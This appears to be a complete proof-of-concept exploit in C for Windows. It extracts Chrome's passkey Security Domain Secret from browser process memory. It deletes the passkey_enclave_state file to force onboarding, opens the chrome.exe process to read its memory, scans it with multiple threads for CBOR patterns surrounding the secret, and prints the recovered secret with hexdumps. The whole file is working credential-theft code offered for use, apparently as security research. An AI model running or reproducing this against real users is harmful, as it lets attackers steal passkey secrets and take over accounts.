/*
 * Pass-ta-key Golden Attack PoC - Extraction of the Security Domain Secret (SDS) from Chrome process memory
 * Copyright (c) 2026 0rcruxe
 * SPDX-License-Identifier: MIT
 * See LICENSE for details.
 */

#include <winsock2.h>
#include <ws2tcpip.h>
#include <windows.h>
#include <iphlpapi.h>
#include <tlhelp32.h>
#include <stdio.h>
#include <string.h>
#include <stdint.h>
#include <stdlib.h>

#pragma comment(lib, "ws2_32.lib")
#pragma comment(lib, "iphlpapi.lib")

// CONFIG
#define ENCLAVE_HOST        "enclave.ua5v.com"
#define TCP_POLL_MS         40
#define DNS_REFRESH_MS      40
#define SCAN_DURATION_MS    10000
#define MAX_CANDIDATES      64
#define NUM_THREADS         8
#define MAX_CONNS           1024
#define TARGET_FILE_A       "passkey_enclave_state"

// Context size captured around each SDS occurrence
#define CTX_BEFORE          64
#define CTX_AFTER           64
#define CTX_LEN             (CTX_BEFORE + 32 + CTX_AFTER)

// CBOR PATTERN
static const uint8_t P_WRAP[] = {
    0x81,0xa3,0x63,0x63,0x6d,0x64,0x69,0x6b,0x65,0x79,0x73,0x2f,
    0x77,0x72,0x61,0x70,0x63,0x6b,0x65,0x79,0x58,0x20
};

static const uint8_t S_WRAP[] = {
    0x67,0x70,0x75,0x72,0x70,0x6f,0x73,0x65,0x76,0x73,0x65,0x63,
    0x75,0x72,0x69,0x74,0x79,0x20,0x64,0x6f,0x6d,0x61,0x69,0x6e,
    0x20,0x73,0x65,0x63,0x72,0x65,0x74
};

static const uint8_t P_ASSERT[] = {
    0x63,0x63,0x6d,0x64,0x6f,0x70,0x61,0x73,0x73,0x6b,0x65,0x79,
    0x73,0x2f,0x61,0x73,0x73,0x65,0x72,0x74,0x66,0x73,0x65,0x63,
    0x72,0x65,0x74,0x58,0x20
};

static const uint8_t P_CREATE[] = {
    0x63,0x63,0x6d,0x64,0x6f,0x70,0x61,0x73,0x73,0x6b,0x65,0x79,
    0x73,0x2f,0x63,0x72,0x65,0x61,0x74,0x65,0x66,0x73,0x65,0x63,
    0x72,0x65,0x74,0x58,0x20
};

static const uint8_t S_RPID[] = {
    0x67,0x72,0x65,0x71,0x75,0x65,0x73,0x74,0xa1,0x64,0x72,0x70,
    0x49,0x64
};

static const uint8_t S_CREATE[] = {
    0x67,0x72,0x65,0x71,0x75,0x65,0x73,0x74,0xa3,0x62,0x72,0x70,
    0xa2,0x62,0x69,0x64
};

enum { PAT_WRAP = 0, PAT_ASSERT = 1, PAT_CREATE = 2 };

typedef struct {
    uint8_t  data[CTX_LEN];
    uint64_t start_addr;
    size_t   sds_offset;
    int      pat_id;
} Occurrence;

typedef struct {
    uint8_t    sds[32];
    char       hex[65];
    int        seen_wrap, seen_assert, seen_create;
    Occurrence occs[3];
    int        occ_count;
} Candidate;

static Candidate        g_candidates[MAX_CANDIDATES];
static int              g_candidate_count = 0;
static CRITICAL_SECTION g_lock;
static wchar_t          g_watch_dir[MAX_PATH * 2];

static volatile LONG g_file_event        = 0;
static volatile LONG g_scan_in_progress  = 0;
static volatile LONG g_tcp_logged        = 0;

static void register_candidate(const uint8_t *sds, uint64_t addr, int pat_id,
                               const uint8_t *buf_start, const uint8_t *buf_end,
                               const uint8_t *sds_ptr) {

    char hex[65] = {0};
    for (int i = 0; i < 32; i++) sprintf(hex + i * 2, "%02x", sds[i]);

    EnterCriticalSection(&g_lock);

    int idx = -1;
    for (int i = 0; i < g_candidate_count; i++) {
        if (strcmp(g_candidates[i].hex, hex) == 0) { idx = i; break; }
    }

    if (idx < 0) {
        if (g_candidate_count >= MAX_CANDIDATES) {
            LeaveCriticalSection(&g_lock); return;
        }
        idx = g_candidate_count++;
        Candidate *c = &g_candidates[idx];
        memset(c, 0, sizeof(*c));
        memcpy(c->sds, sds, 32);
        strcpy(c->hex, hex);
    }
    Candidate *c = &g_candidates[idx];

    int already = 0;
    if (pat_id == PAT_WRAP   && c->seen_wrap)   already = 1;
    if (pat_id == PAT_ASSERT && c->seen_assert) already = 1;
    if (pat_id == PAT_CREATE && c->seen_create) already = 1;

    if (!already) {
        if (pat_id == PAT_WRAP)   c->seen_wrap   = 1;
        if (pat_id == PAT_ASSERT) c->seen_assert = 1;
        if (pat_id == PAT_CREATE) c->seen_create = 1;

        if (c->occ_count < 3) {
            Occurrence *o = &c->occs[c->occ_count++];
            o->pat_id = pat_id;

            const uint8_t *ctx_start = sds_ptr - CTX_BEFORE;
            if (ctx_start < buf_start) ctx_start = buf_start;
            const uint8_t *ctx_end = sds_ptr + 32 + CTX_AFTER;
            if (ctx_end > buf_end) ctx_end = buf_end;

            size_t len = (size_t)(ctx_end - ctx_start);
            if (len > CTX_LEN) len = CTX_LEN;
            memcpy(o->data, ctx_start, len);
            o->start_addr = addr - (uint64_t)(sds_ptr - ctx_start);
            o->sds_offset = (size_t)(sds_ptr - ctx_start);
        }
    }
    LeaveCriticalSection(&g_lock);
}

// Search a pattern (prefix + SDS + suffix) inside a memory buffer
static void scan_pattern(const uint8_t *buf, size_t len, uint64_t base,
                         const uint8_t *prefix, size_t plen,
                         const uint8_t *suffix, size_t slen,
                         int pat_id) {
    if (len < plen + 32 + slen) return;
    const uint8_t *p = buf;
    const uint8_t *end = buf + len - plen - 32 - slen;

    while (p <= end) {
        const uint8_t *m = (const uint8_t *)memchr(p, prefix[0], (size_t)(end - p + 1));
        if (!m) break;
        if (memcmp(m, prefix, plen) != 0) { p = m + 1; continue; }

        const uint8_t *sds = m + plen;
        if (memcmp(sds + 32, suffix, slen) != 0) { p = m + 1; continue; }

        register_candidate(sds, base + (uint64_t)(m - buf), pat_id,
                           buf, buf + len, sds);
        p = m + plen + 32;
    }
}

// Read a memory region and scan it for all three patterns
static void scan_region_bytes(HANDLE h_proc, uint64_t base, size_t size) {
    uint8_t *buf = (uint8_t *)malloc(size);
    if (!buf) return;
    SIZE_T br = 0;

    if (!ReadProcessMemory(h_proc, (LPCVOID)(uintptr_t)base, buf, size, &br) || br < 85) {
        free(buf); return;
    }
    scan_pattern(buf, br, base, P_WRAP, sizeof(P_WRAP),
                 S_WRAP, sizeof(S_WRAP), PAT_WRAP);
    scan_pattern(buf, br, base, P_ASSERT, sizeof(P_ASSERT),
                 S_RPID, sizeof(S_RPID), PAT_ASSERT);
    scan_pattern(buf, br, base, P_CREATE, sizeof(P_CREATE),
                 S_CREATE, sizeof(S_CREATE), PAT_CREATE);
    free(buf);
}

// THREADS
static HANDLE g_thread_proc = NULL;
static volatile LONG g_stop = 0;
typedef struct { uint64_t base; size_t size; } Region;
static Region g_regions[8192];
static volatile LONG g_region_count = 0;
static volatile LONG g_region_index = 0;

static DWORD WINAPI scan_thread(LPVOID arg) {
    (void)arg;
    while (!g_stop) {
        LONG idx = InterlockedIncrement(&g_region_index) - 1;
        if (idx >= g_region_count) { Sleep(1); continue; }
        scan_region_bytes(g_thread_proc, g_regions[idx].base, g_regions[idx].size);
    }
    return 0;
}

// Enumerate all committed, private, read-write regions of the target process
static void enumerate_regions(HANDLE h_proc) {
    g_region_count = 0;
    MEMORY_BASIC_INFORMATION mbi;
    uint64_t addr = 0;
    while (VirtualQueryEx(h_proc, (LPCVOID)(uintptr_t)addr, &mbi, sizeof(mbi))) {
        int is_private = (mbi.Type == MEM_PRIVATE);
        int is_rw = (mbi.Protect & (PAGE_READWRITE | PAGE_WRITECOPY)) != 0;
        int no_guard = (mbi.Protect & PAGE_GUARD) == 0;
        // Keep only regions that are private, writable, and not too large
        if (mbi.State == MEM_COMMIT && is_private && is_rw && no_guard &&
            mbi.RegionSize > 0 && mbi.RegionSize <= 64ULL * 1024 * 1024) {
            if (g_region_count < 8192) {
                g_regions[g_region_count].base = (uint64_t)(uintptr_t)mbi.BaseAddress;
                g_regions[g_region_count].size = (size_t)mbi.RegionSize;
                g_region_count++;
            }
        }
        addr = (uint64_t)(uintptr_t)mbi.BaseAddress + mbi.RegionSize;
        if (addr > 0x7FFFFFFFFFFFULL) break;
    }
}

static DWORD WINAPI file_watcher(LPVOID arg) {
    (void)arg;

    HANDLE h_dir = CreateFileW(
        g_watch_dir,
        FILE_LIST_DIRECTORY,
        FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE,
        NULL, OPEN_EXISTING, FILE_FLAG_BACKUP_SEMANTICS, NULL
    );
    if (h_dir == INVALID_HANDLE_VALUE) return 1;

    uint8_t buf[65536];
    DWORD bytes_ret;

    while (1) {
        if (!ReadDirectoryChangesW(h_dir, buf, sizeof(buf), FALSE,
                                   FILE_NOTIFY_CHANGE_FILE_NAME | FILE_NOTIFY_CHANGE_LAST_WRITE,
                                   &bytes_ret, NULL, NULL)) {
            break;
        }
        DWORD offset = 0;
        while (1) {
            FILE_NOTIFY_INFORMATION *info = (FILE_NOTIFY_INFORMATION *)(buf + offset);
            int nlen = info->FileNameLength / sizeof(wchar_t);
            wchar_t fname[MAX_PATH] = {0};
            wcsncpy(fname, info->FileName, nlen < MAX_PATH ? nlen : MAX_PATH - 1);

            if (_wcsicmp(fname, L"passkey_enclave_state") == 0) {
                if (info->Action == FILE_ACTION_ADDED ||
                    info->Action == FILE_ACTION_RENAMED_NEW_NAME) {
                    if (InterlockedCompareExchange(&g_scan_in_progress, 0, 0) == 0) {
                        if (InterlockedCompareExchange(&g_file_event, 1, 0) == 0) {
                            SYSTEMTIME st; GetLocalTime(&st);
                            printf("[%02d:%02d:%02d.%03d] [FILE] passkey_enclave_state CREATED\n",
                                   st.wHour, st.wMinute, st.wSecond, st.wMilliseconds);
                            fflush(stdout);
                        }
                    }
                }
            }

            if (info->NextEntryOffset == 0) break;
            offset += info->NextEntryOffset;
        }
    }
    CloseHandle(h_dir);
    return 0;
}

// HEXDUMP
static void print_hexdump(uint64_t base, const uint8_t *data, size_t len, size_t sds_off) {
    for (size_t j = 0; j < len; j += 16) {
        size_t chunk = (j + 16 <= len) ? 16 : len - j;
        const char *marker = "";
        if (j <= sds_off && sds_off < j + 16)                marker = "  <<< SDS start";
        else if (j <= sds_off + 31 && sds_off + 31 < j + 16) marker = "  <<< SDS end";

        printf("  %016llX  ", (unsigned long long)(base + j));
        for (size_t k = 0; k < 16; k++) {
            if (k < chunk) printf("%02x ", data[j + k]);
            else           printf("   ");
        }
        printf(" ");
        for (size_t k = 0; k < chunk; k++) {
            uint8_t b = data[j + k];
            putchar((b >= 32 && b < 127) ? b : '.');
        }
        printf("%s\n", marker);
    }
}

// Locate the PID of the main Chrome browser process
static DWORD find_browser_pid(void) {
    HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (snap == INVALID_HANDLE_VALUE) return 0;
    PROCESSENTRY32W e = {0}; e.dwSize = sizeof(e);
    DWORD pids[512] = {0}, ppids[512] = {0};
    int count = 0;
    if (Process32FirstW(snap, &e)) {
        do {
            if (_wcsicmp(e.szExeFile, L"chrome.exe") == 0 && count < 512) {
                pids[count]  = e.th32ProcessID;
                ppids[count] = e.th32ParentProcessID;
                count++;
            }
        } while (Process32NextW(snap, &e));
    }
    CloseHandle(snap);
    if (!count) return 0;
    for (int i = 0; i < count; i++) {
        int parent = 0;
        for (int j = 0; j < count; j++)
            if (pids[j] == ppids[i]) { parent = 1; break; }
        if (!parent) return pids[i];
    }
    return pids[0];
}

// DNS MULTI-RESOLVE (v4 + v6)
typedef struct { char ip[46]; int family; } TargetIP;
static TargetIP g_targets[64];
static int      g_target_count = 0;
static int      g_dns_initialized = 0;

static void add_target_ip(const char *ip, int family) {
    for (int i = 0; i < g_target_count; i++)
        if (strcmp(g_targets[i].ip, ip) == 0) return;
    if (g_target_count >= 64) return;
    strncpy(g_targets[g_target_count].ip, ip, sizeof(g_targets[0].ip) - 1);
    g_targets[g_target_count].ip[sizeof(g_targets[0].ip) - 1] = '\0';
    g_targets[g_target_count].family = family;
    g_target_count++;
}

static void resolve_family(int family) {
    struct addrinfo hints = {0}, *res = NULL;
    hints.ai_family   = family;
    hints.ai_socktype = SOCK_STREAM;

    if (getaddrinfo(ENCLAVE_HOST, NULL, &hints, &res) != 0) return;

    for (struct addrinfo *r = res; r; r = r->ai_next) {
        char buf[46] = {0};
        if (r->ai_family == AF_INET) {
            struct sockaddr_in *sin = (struct sockaddr_in *)r->ai_addr;
            inet_ntop(AF_INET, &sin->sin_addr, buf, sizeof(buf));
            add_target_ip(buf, AF_INET);
        } else if (r->ai_family == AF_INET6) {
            struct sockaddr_in6 *sin6 = (struct sockaddr_in6 *)r->ai_addr;
            inet_ntop(AF_INET6, &sin6->sin6_addr, buf, sizeof(buf));
            add_target_ip(buf, AF_INET6);
        }
    }
    freeaddrinfo(res);
}

static void refresh_target_ips(void) {
    int before = g_target_count;

    resolve_family(AF_INET);
    resolve_family(AF_INET6);

    if (!g_dns_initialized) {
        g_dns_initialized = 1;
        return;
    }

    if (g_target_count > before) {
        printf("[*] DNS refresh: +%d new IP(s) (total %d)\n",
               g_target_count - before, g_target_count);
        for (int i = before; i < g_target_count; i++)
            printf("      %s\n", g_targets[i].ip);
        fflush(stdout);
    }
}

static int is_target_ip(const char *ip) {
    for (int k = 0; k < g_target_count; k++)
        if (strcmp(ip, g_targets[k].ip) == 0) return 1;
    return 0;
}

typedef struct { char key[64]; } Conn;
static Conn g_conns[MAX_CONNS];
static int  g_conns_count = 0;

static int conn_seen(const char *key) {
    for (int i = 0; i < g_conns_count; i++)
        if (strcmp(g_conns[i].key, key) == 0) return 1;
    return 0;
}
static void conn_add(const char *key) {
    if (g_conns_count < MAX_CONNS) {
        strncpy(g_conns[g_conns_count].key, key, sizeof(g_conns[0].key) - 1);
        g_conns[g_conns_count].key[sizeof(g_conns[0].key) - 1] = '\0';
        g_conns_count++;
    }
}

// Look for a new IPv4 TCP connection to one of the enclave IPs
static int check_tcp4(char *hit_ip) {
    DWORD size = 0;
    if (GetExtendedTcpTable(NULL, &size, FALSE, AF_INET,
                            TCP_TABLE_OWNER_PID_CONNECTIONS, 0)
        != ERROR_INSUFFICIENT_BUFFER)
        return 0;

    MIB_TCPTABLE_OWNER_PID *t = (MIB_TCPTABLE_OWNER_PID *)malloc(size);
    if (!t) return 0;

    int found = 0;
    if (GetExtendedTcpTable(t, &size, FALSE, AF_INET,
                            TCP_TABLE_OWNER_PID_CONNECTIONS, 0) == NO_ERROR) {
        for (DWORD i = 0; i < t->dwNumEntries && !found; i++) {
            struct in_addr a; a.S_un.S_addr = t->table[i].dwRemoteAddr;
            char rip[46]; inet_ntop(AF_INET, &a, rip, sizeof(rip));
            if (!is_target_ip(rip)) continue;

            uint16_t rp = (uint16_t)ntohs((u_short)t->table[i].dwRemotePort);
            uint16_t lp = (uint16_t)ntohs((u_short)t->table[i].dwLocalPort);

            char key[64];
            snprintf(key, sizeof(key), "%s:%u:%u", rip, rp, lp);
            if (!conn_seen(key)) {
                conn_add(key);
                found = 1;
                if (hit_ip) strncpy(hit_ip, rip, 45);
            }
        }
    }
    free(t);
    return found;
}

// Look for a new IPv6 TCP connection to one of the enclave IPs
static int check_tcp6(char *hit_ip) {
    DWORD size = 0;
    if (GetExtendedTcpTable(NULL, &size, FALSE, AF_INET6,
                            TCP_TABLE_OWNER_PID_CONNECTIONS, 0)
        != ERROR_INSUFFICIENT_BUFFER)
        return 0;

    MIB_TCP6TABLE_OWNER_PID *t = (MIB_TCP6TABLE_OWNER_PID *)malloc(size);
    if (!t) return 0;

    int found = 0;
    if (GetExtendedTcpTable(t, &size, FALSE, AF_INET6,
                            TCP_TABLE_OWNER_PID_CONNECTIONS, 0) == NO_ERROR) {
        for (DWORD i = 0; i < t->dwNumEntries && !found; i++) {
            char rip[46];
            inet_ntop(AF_INET6, t->table[i].ucRemoteAddr, rip, sizeof(rip));
            if (!is_target_ip(rip)) continue;

            uint16_t rp = (uint16_t)ntohs((u_short)t->table[i].dwRemotePort);
            uint16_t lp = (uint16_t)ntohs((u_short)t->table[i].dwLocalPort);

            char key[64];
            snprintf(key, sizeof(key), "%s:%u:%u", rip, rp, lp);
            if (!conn_seen(key)) {
                conn_add(key);
                found = 1;
                if (hit_ip) strncpy(hit_ip, rip, 45);
            }
        }
    }
    free(t);
    return found;
}

static int has_new_conn(char *hit_ip) {
    if (check_tcp4(hit_ip)) return 1;
    if (check_tcp6(hit_ip)) return 1;
    return 0;
}

static void snapshot_conns(void) {
    {
        DWORD size = 0;
        if (GetExtendedTcpTable(NULL, &size, FALSE, AF_INET,
                                TCP_TABLE_OWNER_PID_CONNECTIONS, 0)
            == ERROR_INSUFFICIENT_BUFFER) {
            MIB_TCPTABLE_OWNER_PID *t = (MIB_TCPTABLE_OWNER_PID *)malloc(size);
            if (t) {
                if (GetExtendedTcpTable(t, &size, FALSE, AF_INET,
                                        TCP_TABLE_OWNER_PID_CONNECTIONS, 0) == NO_ERROR) {
                    for (DWORD i = 0; i < t->dwNumEntries; i++) {
                        struct in_addr a; a.S_un.S_addr = t->table[i].dwRemoteAddr;
                        char rip[46]; inet_ntop(AF_INET, &a, rip, sizeof(rip));
                        if (!is_target_ip(rip)) continue;
                        uint16_t rp = (uint16_t)ntohs((u_short)t->table[i].dwRemotePort);
                        uint16_t lp = (uint16_t)ntohs((u_short)t->table[i].dwLocalPort);
                        char key[64];
                        snprintf(key, sizeof(key), "%s:%u:%u", rip, rp, lp);
                        conn_add(key);
                    }
                }
                free(t);
            }
        }
    }

    {
        DWORD size = 0;
        if (GetExtendedTcpTable(NULL, &size, FALSE, AF_INET6,
                                TCP_TABLE_OWNER_PID_CONNECTIONS, 0)
            == ERROR_INSUFFICIENT_BUFFER) {
            MIB_TCP6TABLE_OWNER_PID *t = (MIB_TCP6TABLE_OWNER_PID *)malloc(size);
            if (t) {
                if (GetExtendedTcpTable(t, &size, FALSE, AF_INET6,
                                        TCP_TABLE_OWNER_PID_CONNECTIONS, 0) == NO_ERROR) {
                    for (DWORD i = 0; i < t->dwNumEntries; i++) {
                        char rip[46];
                        inet_ntop(AF_INET6, t->table[i].ucRemoteAddr, rip, sizeof(rip));
                        if (!is_target_ip(rip)) continue;
                        uint16_t rp = (uint16_t)ntohs((u_short)t->table[i].dwRemotePort);
                        uint16_t lp = (uint16_t)ntohs((u_short)t->table[i].dwLocalPort);
                        char key[64];
                        snprintf(key, sizeof(key), "%s:%u:%u", rip, rp, lp);
                        conn_add(key);
                    }
                }
                free(t);
            }
        }
    }
}

static int run_scan(int duration_ms) {
    DWORD pid = find_browser_pid();
    if (!pid) { printf("[-] Chrome not found\n"); return 0; }

    HANDLE h = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE, pid);
    if (!h) { printf("[-] OpenProcess failed\n"); return 0; }

    EnterCriticalSection(&g_lock);
    g_candidate_count = 0;
    LeaveCriticalSection(&g_lock);

    InterlockedExchange(&g_tcp_logged, 0);

    g_thread_proc = h;
    DWORD start = GetTickCount();
    int pass_n = 0;

    printf("[*] Scanning memory for %d seconds...\n\n", duration_ms / 1000);
    fflush(stdout);

    while ((GetTickCount() - start) < (DWORD)duration_ms) {
        pass_n++;

        // Log the first new TCP connection seen during this scan
        if (InterlockedCompareExchange(&g_tcp_logged, 0, 0) == 0) {
            char hit_ip[46] = {0};
            if (has_new_conn(hit_ip)) {
                SYSTEMTIME st; GetLocalTime(&st);
                printf("[%02d:%02d:%02d.%03d] [+] New TCP connection detected -> %s\n",
                       st.wHour, st.wMinute, st.wSecond, st.wMilliseconds, hit_ip);
                fflush(stdout);
                InterlockedExchange(&g_tcp_logged, 1);
            }
        }

        enumerate_regions(h);
        InterlockedExchange(&g_region_index, 0);
        InterlockedExchange(&g_stop, 0);

        HANDLE threads[NUM_THREADS];
        for (int i = 0; i < NUM_THREADS; i++)
            threads[i] = CreateThread(NULL, 0, scan_thread, NULL, 0, NULL);

        DWORD ps = GetTickCount();
        while (g_region_index < g_region_count &&
               (GetTickCount() - ps) < 2000)
            Sleep(1);

        InterlockedExchange(&g_stop, 1);
        WaitForMultipleObjects(NUM_THREADS, threads, TRUE, 1500);
        for (int i = 0; i < NUM_THREADS; i++) CloseHandle(threads[i]);

        if (pass_n % 5 == 0 || g_candidate_count > 0) {
            SYSTEMTIME st; GetLocalTime(&st);
            printf("  [%02d:%02d:%02d.%03d] pass #%d  %d regions  %d candidate\n",
                   st.wHour, st.wMinute, st.wSecond, st.wMilliseconds,
                   pass_n, (int)g_region_count, g_candidate_count);
            fflush(stdout);
        }
    }

    CloseHandle(h);

    printf("\n");
    printf("================================================================\n");
    printf("[+] Security Domain Secret (SDS) Dumped : %d candidate\n", g_candidate_count);
    printf("================================================================\n");

    for (int i = 0; i < g_candidate_count; i++) {
        Candidate *c = &g_candidates[i];

        printf("\n");
        printf("  #%d\n", i + 1);
        printf("  Patterns : ");
        int first = 1;
        if (c->seen_wrap)   { printf("%skeys/wrap", first ? "" : " & ");       first = 0; }
        if (c->seen_assert) { printf("%spasskeys/assert", first ? "" : " & "); first = 0; }
        if (c->seen_create) { printf("%spasskeys/create", first ? "" : " & "); first = 0; }
        printf("\n\n");

        for (int j = 0; j < c->occ_count; j++) {
            Occurrence *o = &c->occs[j];
            const char *name =
                o->pat_id == PAT_WRAP   ? "keys/wrap" :
                o->pat_id == PAT_ASSERT ? "passkeys/assert" : "passkeys/create";
            printf("  ----- [%s] @ 0x%016llX -----\n",
                   name, (unsigned long long)o->start_addr);
            print_hexdump(o->start_addr, o->data, CTX_LEN, o->sds_offset);
            printf("\n");
        }

        printf("  Security Domain Secret (SDS) : %s\n", c->hex);
        printf("\n");
        fflush(stdout);
    }

    return (g_candidate_count > 0) ? 1 : 0;
}

// Remove passkey_enclave_state to force an onboarding
static void delete_enclave_file(void) {
    char local[MAX_PATH];
    if (!GetEnvironmentVariableA("LOCALAPPDATA", local, MAX_PATH)) return;
    char path[MAX_PATH * 2];
    snprintf(path, sizeof(path),
             "%s\\Google\\Chrome\\User Data\\Default\\%s",
             local, TARGET_FILE_A);
    if (DeleteFileA(path)) printf("[*] '%s' deleted\n", TARGET_FILE_A);
    else                   printf("[*] '%s' not present\n", TARGET_FILE_A);
}

int main(void) {
    printf("================================================================\n");
    printf("  POC - Security Domain Secret (SDS) Extraction\n");
    printf("================================================================\n\n");
    fflush(stdout);

    InitializeCriticalSection(&g_lock);

    WSADATA wsa;
    if (WSAStartup(MAKEWORD(2, 2), &wsa) != 0) { printf("[-] WSAStartup failed\n"); return 1; }
    printf("[*] Winsock initialized\n");

    delete_enclave_file();
    printf("\n");

    DWORD pid = find_browser_pid();
    if (!pid) { printf("[-] Chrome not found\n"); return 1; }
    printf("[*] Browser PID : %lu\n", pid);

    wchar_t local_w[MAX_PATH];
    if (GetEnvironmentVariableW(L"LOCALAPPDATA", local_w, MAX_PATH)) {
        _snwprintf(g_watch_dir, sizeof(g_watch_dir) / sizeof(wchar_t),
                   L"%ls\\Google\\Chrome\\User Data\\Default", local_w);
        CreateThread(NULL, 0, file_watcher, NULL, 0, NULL);
    }

    refresh_target_ips();
    if (g_target_count == 0) { printf("[-] DNS resolution failed\n"); return 1; }
    printf("[*] %s resolved:\n", ENCLAVE_HOST);
    for (int i = 0; i < g_target_count; i++)
        printf("      %s\n", g_targets[i].ip);
    printf("\n");

    snapshot_conns();
    printf("[*] Monitoring TCP connections ...\n\n");
    fflush(stdout);

    DWORD last_dns_refresh = GetTickCount();

    while (1) {
        if (GetTickCount() - last_dns_refresh >= DNS_REFRESH_MS) {
            refresh_target_ips();
            last_dns_refresh = GetTickCount();
        }

        if (g_file_event) {
            InterlockedExchange(&g_file_event, 0);
            InterlockedExchange(&g_scan_in_progress, 1);

            int found = run_scan(SCAN_DURATION_MS);

            InterlockedExchange(&g_scan_in_progress, 0);

            if (found) {
                printf("\n[+] Done. SDS successfully extracted. Exiting.\n");
                break;
            }

            printf("[*] Resuming monitoring...\n\n");
            fflush(stdout);
        }

        Sleep(TCP_POLL_MS);
    }

    while (1) Sleep(1000);

    DeleteCriticalSection(&g_lock);
    WSACleanup();
    return 0;
}
